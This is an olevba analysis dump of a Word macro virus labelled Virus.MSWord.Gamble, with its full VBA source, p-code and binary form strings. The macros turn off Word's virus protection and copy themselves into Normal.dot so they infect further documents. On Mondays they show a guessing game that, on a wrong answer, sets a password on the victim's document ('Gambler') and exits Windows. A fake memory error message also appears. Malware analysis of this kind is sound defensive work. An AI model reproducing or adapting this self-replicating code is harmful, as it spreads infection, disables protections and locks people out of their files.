olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gamble
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gamble - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Gamble.bas 
in file: Virus.MSWord.Gamble - OLE stream: 'Macros/VBA/Gamble'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    On Error GoTo Error
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    Rename$ = "c:\program files\microsoft office\templates\normal.dot"
    SetAttr Rename$, vbNormal
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    Documentinstalled = False
    Globalinstalled = False
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Gamble" Then
            Documentinstalled = True
        End If
        Next
    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Gamble" Then
            Globalinstalled = True
        End If
        Next
    If Documentinstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Gamble", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform999", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform998", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        End If
    If Globalinstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Gamble", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="userform999", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="userform998", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        End If
Application.DisplayAlerts = wdAlertsAll

Error:
Gamble1
End Sub
Sub Gamble1()
On Error GoTo Error
Application.StatusBar = True
StatusBar = "The Gambler WMV97"
Application.Caption = "The Gambler WMV97"
With ActiveDocument
.BuiltInDocumentProperties(wdPropertyTitle) = "The Gambler"
.BuiltInDocumentProperties(wdPropertySubject) = "Word Macro Virri"
.BuiltInDocumentProperties(wdPropertyAuthor) = "Talon 1997"
.BuiltInDocumentProperties(wdPropertyManager) = "Talon 1997"
.BuiltInDocumentProperties(wdPropertyCompany) = "Virii Productions"
.BuiltInDocumentProperties(wdPropertyComments) = "This Word Macro Virus was Made By Talon"
End With
If WeekDay(Now()) = 2 Then
On Error GoTo Error
userForm998.Show
Else
End If
Error:
End Sub
Sub ToolsMacro()
On Error GoTo Error
userform999.Show
Error:
End Sub
-------------------------------------------------------------------------------
VBA MACRO userform999.frm 
in file: Virus.MSWord.Gamble - OLE stream: 'Macros/VBA/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Normal.dot(global template)"
End Sub
Private Sub CommandButton2_Click()
Unload userform999
End Sub
Private Sub CommandButton5_Click()
MsgBox "Not Enough Memory To Complete The Request", 16, "Memory Allocation Error"
Unload userform999
End Sub
Private Sub UserForm_Click()
MsgBox "Not Enough Memory To Complete The Request", 16, "Memory Allocation Error"
Unload userform999
End Sub
-------------------------------------------------------------------------------
VBA MACRO userForm998.frm 
in file: Virus.MSWord.Gamble - OLE stream: 'Macros/VBA/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Image1_Click()
MsgBox "Are You Trying To Cheat?? One More Attempt like That And it's Over", 16, "Trying To Cheat??"
End Sub
Private Sub Label2_Click()
MsgBox "Are You Trying To Cheat?? One More Attempt like That And it's Over", 16, "Trying To Cheat??"
End Sub
Private Sub Label3_Click()
MsgBox "Are You Trying To Cheat?? One More Attempt like That And it's Over", 16, "Trying To Cheat??"
End Sub
Private Sub Label4_Click()
MsgBox "Are You Trying To Cheat?? One More Attempt like That And it's Over", 16, "Trying To Cheat??"
End Sub
Private Sub UserForm_Click()
MsgBox "Are You Trying To Cheat?? One More Attempt like That And it's Over", 16, "Trying To Cheat??"
End Sub
Private Sub CommandButton1_Click()
Dim Message, Title, MyValue
Message = "Enter a value between 1 and 10"
Title = "Word Macro Virus Gambler97"
Begining:
gam$ = "Gamble"
frm1$ = "userform998"
frm2$ = "userform999"
MyValue = InputBox(Message, Title)
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(Arg1:=wdKeyControl, Arg2:=wdKeyB)).Clear
On Error Resume Next
If MyValue = "" Then GoTo Begining
If MyValue = "0" Then GoTo Begining
If MyValue = "5" Then
MsgBox "Good Guess, It's All Yours", 16, "Your A Winner"
Application.OrganizerDelete ActiveDocument, gam$, wdOrganizerObjectProjectItems
Application.OrganizerDelete ActiveDocument, frm1$, wdOrganizerObjectProjectItems
Application.OrganizerDelete ActiveDocument, frm2$, wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate, gam$, wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate, frm1$, wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate, frm2$, wdOrganizerObjectProjectItems
ActiveDocument.Save
Unload userForm998
GoTo Done
Else
End If
ActiveDocument.Password = "Gambler"
Application.OrganizerDelete ActiveDocument, gam$, wdOrganizerObjectProjectItems
Application.OrganizerDelete ActiveDocument, frm1$, wdOrganizerObjectProjectItems
Application.OrganizerDelete ActiveDocument, frm2$, wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate, gam$, wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate, frm1$, wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate, frm2$, wdOrganizerObjectProjectItems
ActiveDocument.Save
Tasks.ExitWindows
Done:
Tasks.ExitWindows
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Gamble
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1388 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Macros/VBA/Gamble - 8633 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Error 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #3:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #4:
' 	LitStr 0x0036 "c:\program files\microsoft office\templates\normal.dot"
' 	St Rename$ 
' Line #5:
' 	Ld Rename$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #9:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #10:
' 	LitVarSpecial (False)
' 	St Documentinstalled 
' Line #11:
' 	LitVarSpecial (False)
' 	St Globalinstalled 
' Line #12:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #13:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Gamble"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitVarSpecial (True)
' 	St Documentinstalled 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Gamble"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (True)
' 	St Globalinstalled 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	Ld Documentinstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Gamble"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #25:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform998"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #26:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld Globalinstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Gamble"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "userform998"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #35:
' Line #36:
' 	Label Error 
' Line #37:
' 	ArgsCall Gamble1 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub Gamble1())
' Line #40:
' 	OnError Error 
' Line #41:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #42:
' 	LitStr 0x0011 "The Gambler WMV97"
' 	St StatusBar 
' Line #43:
' 	LitStr 0x0011 "The Gambler WMV97"
' 	Ld Application 
' 	MemSt Caption 
' Line #44:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #45:
' 	LitStr 0x000B "The Gambler"
' 	Ld wdPropertyTitle 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #46:
' 	LitStr 0x0010 "Word Macro Virri"
' 	Ld wdPropertySubject 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #47:
' 	LitStr 0x000A "Talon 1997"
' 	Ld wdPropertyAuthor 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #48:
' 	LitStr 0x000A "Talon 1997"
' 	Ld wdPropertyManager 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #49:
' 	LitStr 0x0011 "Virii Productions"
' 	Ld wdPropertyCompany 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #50:
' 	LitStr 0x0027 "This Word Macro Virus was Made By Talon"
' 	Ld wdPropertyComments 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #51:
' 	EndWith 
' Line #52:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #53:
' 	OnError Error 
' Line #54:
' 	Ld userForm998 
' 	ArgsMemCall Show 0x0000 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Label Error 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub ToolsMacro())
' Line #60:
' 	OnError Error 
' Line #61:
' 	Ld userform999 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	Label Error 
' Line #63:
' 	EndSub 
' Macros/VBA/userform999 - 4892 bytes
' Line #0:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #1:
' 	LitStr 0x001B "Normal.dot(global template)"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #4:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #7:
' 	LitStr 0x0029 "Not Enough Memory To Complete The Request"
' 	LitDI2 0x0010 
' 	LitStr 0x0017 "Memory Allocation Error"
' 	ArgsCall MsgBox 0x0003 
' Line #8:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #11:
' 	LitStr 0x0029 "Not Enough Memory To Complete The Request"
' 	LitDI2 0x0010 
' 	LitStr 0x0017 "Memory Allocation Error"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' 	Ld userform999 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndSub 
' Macros/VBA/userForm998 - 5909 bytes
' Line #0:
' 	FuncDefn (Private Sub Image1_Click())
' Line #1:
' 	LitStr 0x0042 "Are You Trying To Cheat?? One More Attempt like That And it's Over"
' 	LitDI2 0x0010 
' 	LitStr 0x0011 "Trying To Cheat??"
' 	ArgsCall MsgBox 0x0003 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub Label2_Click())
' Line #4:
' 	LitStr 0x0042 "Are You Trying To Cheat?? One More Attempt like That And it's Over"
' 	LitDI2 0x0010 
' 	LitStr 0x0011 "Trying To Cheat??"
' 	ArgsCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub Label3_Click())
' Line #7:
' 	LitStr 0x0042 "Are You Trying To Cheat?? One More Attempt like That And it's Over"
' 	LitDI2 0x0010 
' 	LitStr 0x0011 "Trying To Cheat??"
' 	ArgsCall MsgBox 0x0003 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub Label4_Click())
' Line #10:
' 	LitStr 0x0042 "Are You Trying To Cheat?? One More Attempt like That And it's Over"
' 	LitDI2 0x0010 
' 	LitStr 0x0011 "Trying To Cheat??"
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #13:
' 	LitStr 0x0042 "Are You Trying To Cheat?? One More Attempt like That And it's Over"
' 	LitDI2 0x0010 
' 	LitStr 0x0011 "Trying To Cheat??"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #16:
' 	Dim 
' 	VarDefn Message
' 	VarDefn Title
' 	VarDefn MyValue
' Line #17:
' 	LitStr 0x001E "Enter a value between 1 and 10"
' 	St Message 
' Line #18:
' 	LitStr 0x001A "Word Macro Virus Gambler97"
' 	St Title 
' Line #19:
' 	Label Begining 
' Line #20:
' 	LitStr 0x0006 "Gamble"
' 	St gam$ 
' Line #21:
' 	LitStr 0x000B "userform998"
' 	St frm1$ 
' Line #22:
' 	LitStr 0x000B "userform999"
' 	St frm2$ 
' Line #23:
' 	Ld Message 
' 	Ld Title 
' 	ArgsLd InputBox 0x0002 
' 	St MyValue 
' Line #24:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #25:
' 	Ld wdKeyControl 
' 	ParamNamed Arg1 
' 	Ld wdKeyB 
' 	ParamNamed Arg2 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	Ld MyValue 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Begining 
' 	EndIf 
' Line #28:
' 	Ld MyValue 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Begining 
' 	EndIf 
' Line #29:
' 	Ld MyValue 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitStr 0x001A "Good Guess, It's All Yours"
' 	LitDI2 0x0010 
' 	LitStr 0x000D "Your A Winner"
' 	ArgsCall MsgBox 0x0003 
' Line #31:
' 	Ld ActiveDocument 
' 	Ld gam$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #32:
' 	Ld ActiveDocument 
' 	Ld frm1$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #33:
' 	Ld ActiveDocument 
' 	Ld frm2$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #34:
' 	Ld NormalTemplate 
' 	Ld gam$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #35:
' 	Ld NormalTemplate 
' 	Ld frm1$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #36:
' 	Ld NormalTemplate 
' 	Ld frm2$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #37:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #38:
' 	Ld userForm998 
' 	ArgsCall Unlock 0x0001 
' Line #39:
' 	GoTo Done 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	LitStr 0x0007 "Gambler"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #43:
' 	Ld ActiveDocument 
' 	Ld gam$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #44:
' 	Ld ActiveDocument 
' 	Ld frm1$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #45:
' 	Ld ActiveDocument 
' 	Ld frm2$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #46:
' 	Ld NormalTemplate 
' 	Ld gam$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #47:
' 	Ld NormalTemplate 
' 	Ld frm1$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #48:
' 	Ld NormalTemplate 
' 	Ld frm2$ 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #49:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #50:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #51:
' 	Label Done 
' Line #52:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF87a@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
33333f33�33�33�3f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3f33ff3f�3f�3f�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3��3��3��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3̙3��3��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3��3��3��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f33f3ff3�f3�f3�ff
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ff3fffff�ff�ff�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff��f��f��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff̙f��f��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff��f��f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3̙3��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f̙f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����̙����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��̙����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����̙���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3��3��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f��f�̙
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3̙f̙�̙�̙���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3��3��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f��f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(((555CCCPPP]]]kkkxxx������������������������������������������������������������������������������������������,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3j�ȱ�Ǐ C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��ɓ(S�\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
